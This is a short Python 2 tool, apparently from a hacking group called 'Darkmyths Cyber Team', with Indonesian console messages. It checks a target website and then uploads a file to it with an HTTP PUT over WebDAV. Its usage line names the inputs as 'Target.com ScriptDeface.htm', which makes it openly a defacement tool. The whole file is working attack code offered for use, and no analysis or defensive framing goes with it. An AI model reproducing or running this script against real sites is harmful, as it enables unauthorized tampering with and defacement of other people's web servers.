#!/usr/bin/python

import requests
import string
import random
import sys
import os

os.system("clear")

print """
       ____     ____ ___    ___  ________  ________
      /    \   /    \\  \  /  / |_____   ||  ____  |
      |     \_/     | \  \/  /       /  / | |    | |
      |   |\   /|   | /      \      /  /  | |____| |
      |___| \_/ |___|/___/\___\    /__/   |________|Tools V 0.1 """"

def webdav():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print("[*] Nama File : %s") % (sys.argv[2])
  print("[*] Uploading %d bytes, Script baru") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print("[!] Gagal")
    sys.exit(1)
  else:
    print("[+] sudah")
    print("[+] PATH : "+host + nama)


def cekfile():
 print("""
[*] WebDAV File
[*] By Mx70lit
[*] Darkmyths Cyber Team
""")
 print("[*] mengecek files : "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print("[*] sudah ada")
  tanya = raw_input("[!] diubah? [Y/N] > ")
  if tanya == "Y":
   webdav()
  else:
   print("[!] udah selesai")
   sys.exit()
 else:
   print("[*] File tidak di target")
   print("[*] Proses Upload Script...")
   webdav()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\n[*] Usage: "+sys.argv[0]+" Target.com ScriptDeface.htm\n")
    sys.exit(0)
  else:
    cekfile()